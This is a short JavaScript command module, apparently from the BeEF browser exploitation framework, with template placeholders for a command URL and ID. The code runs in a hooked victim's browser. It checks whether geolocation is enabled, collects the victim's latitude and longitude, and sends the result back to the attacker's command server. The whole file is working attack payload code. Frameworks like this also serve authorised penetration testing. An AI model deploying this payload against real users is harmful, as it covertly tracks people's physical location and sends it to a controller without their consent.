beef.execute(function() {

    if(!beef.geolocation.isGeolocationEnabled()){
        beef.net.send("<%= @command_url %>", <%= @command_id %>, "geoLocEnabled=FALSE&latitude=&longitude=");
		return;
    }

    beef.geolocation.getGeolocation("<%= @command_url %>", <%= @command_id %>);

});

